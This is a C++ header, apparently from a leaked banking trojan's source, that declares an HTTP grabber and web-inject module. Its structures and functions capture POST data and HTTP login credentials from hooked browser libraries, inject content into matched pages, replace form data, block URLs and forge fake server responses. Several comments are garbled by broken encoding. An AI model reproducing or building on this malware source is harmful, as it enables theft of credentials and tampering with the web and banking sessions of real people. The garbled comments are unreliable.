/*
  Общии функции для граббинга HTTP.
*/
#pragma once

#if(BO_WININET > 0 || BO_NSPR4 > 0 || 1)

#include "..\common\httpinject.h"
#include "..\common\binstorage.h"

namespace HttpGrabber
{
  //Different constants.
  enum
  {
    MAX_POSTDATA_SIZE = 1 * 1024 * 1024
  };
  
  //Type of request.
  enum
  {
    VERB_GET,  //GET
    VERB_POST  //POST
  };

  //These inzheyte to fakie.
  typedef struct
  {
    DWORD flags;                      //Flags HttpInject:: FLAG_ *.
    LPSTR urlMask;                    //Mask URL.
    LPSTR fakeUrl;                    //URL Faika if it is fake.
    LPSTR blockOnUrl;                 //URL blocking this Faika / injection produce.
    LPSTR contextMask;                //White mask content.
    HttpInject::INJECTBLOCK *injects; //These injection produce. Already checked for errors.
    DWORD injectsSize;                //Injects size in bytes.
  }INJECTFULLDATA;

  //Query flags.
  enum
  {
    RDF_WININET = 0x1, //Request came from the wininet.
    RDF_NSPR4   = 0x2, //Request came from NSPR4.
  };

  //Request data.
  typedef struct
  {    
    /*
      Флаги.
    */
    DWORD flags;
    
    /*
      IN Некий хэндл запроса (зависит от перехватываемой библиотеки).
    */
    void *handle;
    
    /*
      IN URL. Выделяется через Mem.
      
      Освобождается через _freeRequestData().
    */
    LPSTR url;

    /*
      IN Кол. байт в URL, исключая нулевеой байт.
    */
    DWORD urlSize;

    /*
      IN Реферер.
      
      Освобождается через _freeRequestData().
    */
    LPSTR referer;

    /*
      IN Кол. байт в реферерере, исключая нулевеой байт.
    */
    DWORD refererSize;

    /*
      IN VERB_*.
    */
    BYTE verb;

    /*
      IN Тип контента, т.е. тип POST-данных.
      
      Освобождается через _freeRequestData().
    */
    LPSTR contentType;

    /*
      IN Размер contentTypeSize.
    */
    DWORD contentTypeSize;

    /*
      IN OUT POST-данные (могут не кончатсья на 0). Если возращен флаг
      ANALIZEFLAG_POSTDATA_REPLACED,данные будут подменены на новые данные, которые нужно
      освободить через Mem после отправки запроса.
    */
    void *postData;

    /*
      IN OUT Размер postData. Значение не должно превыщать MAX_POSTDATA_SIZE.
    */
    DWORD postDataSize;

    /*
      IN Данные HTTP-авторизации.
    */
    struct 
    {
      LPWSTR userName;   //User name.
      LPWSTR password;   //Password.
      LPSTR unknownType; //Filled the original string if an unknown type of authorization.
    }authorizationData;

    /*
      OUT Список инжектов, актуально только при ANALIZEFLAG_URL_INJECT. 

      Освобождается через _freeInjectFullDataList().
    */
    INJECTFULLDATA *injects;

    /*
      OUT Размер массива injectData.
    */
    DWORD injectsCount;

    /*
      IN Текущая конфигурация. NULL, если не сущетвует. Данная конфигурация доступна только для
      чтения.

      Освобождается через _freeRequestData().
    */
    BinStorage::STORAGE *dynamicConfig;

    /*
      IN Текущая локальная конфигурация. NULL, если не сущетвует. Данная конфигурация доступна
      только для чтения.

      Освобождается через _freeRequestData().
    */
    BinStorage::STORAGE *localConfig;
  }REQUESTDATA;

  //Flags for analizeRequestData ().
  enum
  {
    ANALIZEFLAG_URL_BLOCKED         = 0x01, //To applicable. External interrupt handler must query the
                                           //URL. When this flag can not be returned
                                           //ANALIZEFLAG_POSTDATA_REPLACED, ANALIZEFLAG_URL_INJECT.
    
    ANALIZEFLAG_URL_INJECT          = 0x02, //Action. The data on inzheyt / fake.

    ANALIZEFLAG_POSTDATA_REPLACED   = 0x04, //Р”РµР№СЃС‚РІРёРµ. РќРѕРІС‹Рµ POST-РґР°РЅРЅС‹Рµ СЃРѕС…СЂР°РЅРµРЅС‹ РІ REQUESTDATA.postData.


    ANALIZEFLAG_SAVED_REPORT        = 0x08, //Information. Query is stored in the report.
    
    ANALIZEFLAG_POSTDATA_URLENCODED = 0x10, //Post data coded in "application / x-www-form-urlencoded".

    ANALIZEFLAG_AUTHORIZATION       = 0x20  //Data is present HTTP-authorization.
  };

  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Геренация пути для фейка используя часть ориганльноой URL на основе ее маски (крутое предложение да? ;))

    IN fakeUrl     - фейковая URL, которой будет доабвлена часть из originalUrl.
    IN originalUrl - оригинальная URL, которая совпала с маской urlMask.
    IN urlMask     - urlMask маска URL, в которой обязательно должен присутвовать символ '/'.

    Return         - полный URL фейка (нужно удалить через Mem),
                     NULL - в случаи ошибки.
  */
  LPSTR _genarateMirrorFakeUrlA(const LPSTR fakeUrl, const LPSTR originalUrl, const LPSTR urlMask);
  
  /*
    Надстройка над Str::matchA() для URL.

    IN mask     - маска.
    IN url      - URL.
    IN urlSize  - размер URL.
    IN advFlags - дополнительные флаги Str::MATCH_*.

    Return - true  - совпадение найдено,
             false - совпадение не найдено.
  */
  bool _matchUrlA(const LPSTR mask, const LPSTR url, DWORD urlSize, DWORD advFlags);

  /*
    Надстройка над Str::matchA() для POST-данных.

    IN mask         - маска.
    IN postData     - POST-данные.
    IN postDataSize - размер POST-данных.

    Return          - true  - совпадение найдено,
                      false - совпадение не найдено.
  */
  bool _matchPostDataA(const LPSTR mask, const LPSTR postData, DWORD postDataSize);
  
  /*
    Надстройка над Str::matchA() для текстового содержимого.

    IN mask        - маска.
    IN context     - содержимое.
    IN contextSize - размер содержимого.
    IN advFlags    - дополнительные флаги Str::MATCH_*.

    Return         - true  - совпадение найдено,
                     false - совпадение не найдено.
  */
  bool _matchContextA(const LPSTR mask, const void *context, DWORD contextSize, DWORD advFlags);

  /*
    Надстройка над Str::matchA() для текстового содержимого.

    IN mask         - маска.
    IN maskSize     - размер маски.
    IN context      - содержимое.
    IN contextSize  - размер содержимого.
    OUT offsetBegin - оффсет начала действия маски в context. Может быть NULL.
    OUT offsetEnd   - оффсет конца действия маски в context. Может быть NULL.
    IN advFlags     - дополнительные флаги Str::MATCH_*.

    Return          - true  - совпадение найдено,
                      false - совпадение не найдено.
  */
  bool _matchContextExA(const void *mask, DWORD maskSize, const void *context, DWORD contextSize, LPDWORD offsetBegin, LPDWORD offsetEnd, DWORD advFlags);

  /*
    Добавление элемента в список URL.

    IN listId          - тип списка LocalConfig::ITEM_URLLIST_*.
    IN OUT localConfig - локальная конфигурация.
    IN urlMask         - маска URL.

    Return             - true - в случаи успеха,
                         false - в случаи ошибки.

  */
  bool _addUrlMaskToList(DWORD listId, BinStorage::STORAGE **localConfig, const LPSTR urlMask);
  
  /*
    Удаление элемента из список URL.

    IN listId          - тип списка LocalConfig::ITEM_URLLIST_*.
    IN OUT localConfig - локальная конфигурация.
    IN maskOfurlMask   - маска маски URL.

    Return             - true - в случаи успеха,
                         false - в случаи ошибки.

  */
  bool _removeUrlMaskFromList(DWORD listId, BinStorage::STORAGE **localConfig, const LPSTR maskOfurlMask);
  
  /*
    Проверка находиться ли URL в списке.

    IN listId      - тип списка LocalConfig::ITEM_URLLIST_*.
    IN localConfig - локальная конфигурация.
    IN url         - URL.
    IN urlSize     - размер URL.
    IN advFlags    - дополнительные флаги Str::MATCH_*.

    Return         - true - URL найдена,
                     false - URL не найдена.
  */
  bool _isUrlInList(DWORD listId, const BinStorage::STORAGE *localConfig, const LPSTR url, DWORD urlSize, DWORD advFlags);
  
  /*
    Анализ URL, и установка соответвующих задач для нее.

    IN OUT requestData - данные запроса.
    
    Return             - ANALIZEFLAG_*.
  */
  DWORD analizeRequestData(REQUESTDATA *requestData);

  /*
    Исполнение инжектов в контексте.

    IN url             - URL.
    IN OUT context     - контекст для изменения.
    IN OUT contextSize - размер контекста.
    IN dataList        - список инжектов.
    IN count           - кол. инжектов.

    Return             - true - в конекст были внесены изменения,
                         false - изменения не были внесены (не означает ошибку).
  */
  bool _executeInjects(const LPSTR url, LPBYTE *context, LPDWORD contextSize, const INJECTFULLDATA *dataList, DWORD count);

  /*
    Проверяет, является ли массив фейком.

    IN dataList - массив.
    IN count    - размер массива.

    Return      - true - является,
                  false - не является.
  */
  bool _isFakeData(INJECTFULLDATA *dataList, DWORD count);
  
  /*
    Освобождение всех данных REQUESTDATA выделеяемых через Mem.

    IN OUT requestData - структура.
  */
  void _freeRequestData(REQUESTDATA *requestData);

  /*
    Освобождение всех данных INJECTFULLDATA выделеяемых через Mem.

    IN OUT data - структура.
  */
  void _freeInjectFullData(INJECTFULLDATA *data);
  
  /*
    Освобождение всего массива INJECTFULLDATA.

    IN dataList - массив.
    IN count    - размер массива.
  */
  void _freeInjectFullDataList(INJECTFULLDATA *dataList, DWORD count);

  /*В В В В Creating a fake response from the server.

В В В В IN requestData - data of the original query.
В В В В IN fakeData - Faika data.

В В В В Return - the handle of the server's response, NULL - otherwise.
В В */
  HINTERNET _createFakeResponse(REQUESTDATA *requestData, INJECTFULLDATA *fakeData);
};
#endif
